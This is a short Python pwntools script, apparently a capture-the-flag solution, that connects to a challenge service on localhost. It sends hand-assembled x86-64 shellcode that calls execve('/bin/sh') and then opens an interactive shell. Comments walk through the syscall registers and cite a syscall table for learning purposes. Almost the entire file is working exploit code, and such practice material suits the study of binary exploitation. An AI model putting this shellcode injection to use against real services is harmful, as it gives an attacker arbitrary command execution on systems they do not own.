from pwn import *

context.arch = 'amd64'
# p = process("./app/chall")
p = remote("localhost", 21238)

# discourage automation, encourage learning
# so i will write the shellcode by hand

# refer to syscall table for syscall and args
# https://syscalls.w3challs.com/?arch=x86_64
p.sendline(asm("""

/*  execve syscall 
    rax = 0x3b
    rdi = "/bin/sh"
    rsi = 0
    rdx = 0         */

mov rax, 0x3b

// push /bin/sh
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

"""))
# p.sendline(asm(shellcraft.sh()))

p.interactive()
